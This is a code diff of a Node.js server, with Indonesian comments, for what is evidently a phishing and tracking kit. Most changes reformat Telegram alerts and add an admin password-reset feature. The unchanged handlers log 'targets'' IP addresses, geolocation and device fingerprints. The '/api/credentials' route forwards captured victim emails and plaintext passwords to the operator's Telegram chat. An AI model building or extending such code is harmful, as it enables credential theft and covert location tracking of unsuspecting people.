@@ -1,4 +1,4 @@
-// File: server.js (v14.2 - Final Full Integration)
+// File: server.js (v14.5 - FINAL VERSION)
 
 require('dotenv').config();
 
@@ -16,6 +16,7 @@ const axios = require('axios');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const cheerio = require('cheerio');
+const crypto = require('crypto');
 
 const app = express();
 const server = http.createServer(app);
@@ -50,7 +51,9 @@ const sendTelegramNotification = async (message) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
     if (!botToken || !chatId) return;
     try {
-        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
+        // --- PERBAIKAN FINAL ADA DI SINI ---
+        // Menggunakan parse_mode 'HTML' agar lebih andal untuk link
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: message, parse_mode: 'HTML' });
     } catch (error) {
         console.error('❌ Gagal mengirim notifikasi Telegram:', error.response ? error.response.data : error.message);
     }
@@ -234,6 +237,79 @@ app.post('/login', async (req, res) => {
     }
 });
 
+// --- FITUR LUPA PASSWORD VIA TELEGRAM ---
+app.post('/request-password-reset-telegram', async (req, res) => {
+    try {
+        const [admins] = await db.query('SELECT id, username FROM users WHERE is_admin = TRUE');
+        if (admins.length === 0) {
+            return res.status(404).json({ message: 'Tidak ada akun admin yang ditemukan.' });
+        }
+
+        let telegramMessage = '<b>🚨 PERMINTAAN RESET PASSWORD ADMIN 🚨</b>\n\n';
+        telegramMessage += 'Berikut adalah daftar link reset untuk setiap admin. Link ini hanya berlaku selama 1 jam.\n\n';
+
+        for (const admin of admins) {
+            const token = crypto.randomBytes(20).toString('hex');
+            const expires = new Date(Date.now() + 3600000); // Berlaku 1 jam
+
+            await db.query(
+                'UPDATE users SET reset_password_token = ?, reset_password_expires = ? WHERE id = ?',
+                [token, expires, admin.id]
+            );
+
+            const resetLink = `http://${req.headers.host}/reset-password.html?token=${token}`;
+            
+            telegramMessage += `👤 <b>Username:</b> <code>${admin.username}</code>\n`;
+            telegramMessage += `<a href="${resetLink}">Klik Di Sini Untuk Reset Password</a>\n\n`;
+        }
+        
+        await sendTelegramNotification(telegramMessage);
+
+        res.status(200).json({ message: 'Notifikasi reset password telah berhasil dikirim ke channel Telegram.' });
+
+    } catch (error) {
+        console.error("Error saat meminta reset password via Telegram:", error);
+        res.status(500).json({ message: 'Server error' });
+    }
+});
+
+app.post('/reset-password/:token', async (req, res) => {
+    try {
+        const { token } = req.params;
+        const { password } = req.body;
+
+        if (!password || password.length < 6) {
+             return res.status(400).json({ message: 'Password minimal harus 6 karakter.' });
+        }
+
+        const [users] = await db.query(
+            'SELECT * FROM users WHERE reset_password_token = ? AND reset_password_expires > NOW()',
+            [token]
+        );
+
+        if (users.length === 0) {
+            return res.status(400).json({ message: 'Token reset password tidak valid atau sudah kedaluwarsa.' });
+        }
+
+        const user = users[0];
+        const hashedPassword = await bcrypt.hash(password, saltRounds);
+
+        await db.query(
+            'UPDATE users SET password = ?, reset_password_token = NULL, reset_password_expires = NULL WHERE id = ?',
+            [hashedPassword, user.id]
+        );
+        
+        await sendTelegramNotification(`✅ Password untuk admin <b>${user.username}</b> telah berhasil direset.`);
+        res.status(200).json({ message: 'Password berhasil direset. Anda sekarang bisa login.' });
+
+    } catch(error){
+        console.error("Error saat mereset password:", error);
+        res.status(500).json({ message: 'Server error' });
+    }
+});
+// --- AKHIR DARI FITUR LUPA PASSWORD ---
+
+
 // =================================================================
 // === RUTE API (PENTING: HARUS SEBELUM /:id) ===
 // =================================================================
@@ -278,7 +354,7 @@ app.post('/api/admins', protectRoute, async (req, res) => {
 
 app.delete('/api/admins/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
-    const { userId } = req.user; // ID of the admin performing the action
+    const { userId } = req.user;
 
     if (Number(id) === userId) {
         return res.status(403).json({ message: "Error: Admins cannot delete their own account." });
@@ -389,16 +465,16 @@ app.post('/api/fingerprint', async (req, res) => {
         const os = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
         
         const telegramMessage = `
-*🔬 Device Fingerprinted!*
-*Link ID:* \`${trackerId}\`
-*Hash:* \`${fingerprintHash}\`
-*--- INTEL ANALYTICS ---*
-*Device:* \`${browser} on ${os}\`
-*Resolution:* \`${details.screenResolution}\`
-*Language:* \`${details.language}\`
-*Platform:* \`${details.platform}\``;
+<b>🔬 Device Fingerprinted!</b>
+<b>Link ID:</b> <code>${trackerId}</code>
+<b>Hash:</b> <code>${fingerprintHash}</code>
+--- INTEL ANALYTICS ---
+<b>Device:</b> <code>${browser} on ${os}</code>
+<b>Resolution:</b> <code>${details.screenResolution}</code>
+<b>Language:</b> <code>${details.language}</code>
+<b>Platform:</b> <code>${details.platform}</code>`;
 
-        sendTelegramNotification(telegramMessage);
+        await sendTelegramNotification(telegramMessage);
 
         res.json({ status: 'success' });
     } catch (error) {
@@ -450,13 +526,13 @@ app.post('/log', async (req, res) => {
         broadcastLogMessage(`> 📍 Lokasi dari [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
         
         const telegramMessage = `
-*💀 Target Terdeteksi! 💀*
-*Target ID:* \`${username}\`
-*IP Address:* \`${ipAddress}\`
-*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
-*Provider:* ${isp || 'N/A'}
-*Perangkat:* ${browserInfo} pada ${osInfo}
-*Lihat di Peta:* [Google Maps](https://maps.google.com/?q=${latitude},${longitude})`;
+<b>💀 Target Terdeteksi! 💀</b>
+<b>Target ID:</b> <code>${username}</code>
+<b>IP Address:</b> <code>${ipAddress}</code>
+<b>Lokasi:</b> ${city || 'N/A'}, ${country || 'N/A'}
+<b>Provider:</b> ${isp || 'N/A'}
+<b>Perangkat:</b> ${browserInfo} pada ${osInfo}
+<a href="http://googleusercontent.com/maps.google.com/?q=${latitude},${longitude}">Lihat di Peta</a>`;
         
         await sendTelegramNotification(telegramMessage);
         const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
@@ -481,13 +557,13 @@ app.post('/api/credentials', async (req, res) => {
         if (rows.length > 0) {
             const username = rows[0].username;
             const message = `
-*🔒 Credentials Captured! 🔒*
-*Target ID:* \`${username}\`
-*Link ID:* \`${trackerId}\`
-*IP Address:* \`${ipAddress}\`
-*--- CAPTURED DATA ---*
-*Email:* \`${email}\`
-*Password:* \`${password}\``;
+<b>🔒 Credentials Captured! 🔒</b>
+<b>Target ID:</b> <code>${username}</code>
+<b>Link ID:</b> <code>${trackerId}</code>
+<b>IP Address:</b> <code>${ipAddress}</code>
+--- CAPTURED DATA ---
+<b>Email:</b> <code>${email}</code>
+<b>Password:</b> <code>${password}</code>`;
             await sendTelegramNotification(message);
         }
         broadcastDashboardUpdate();
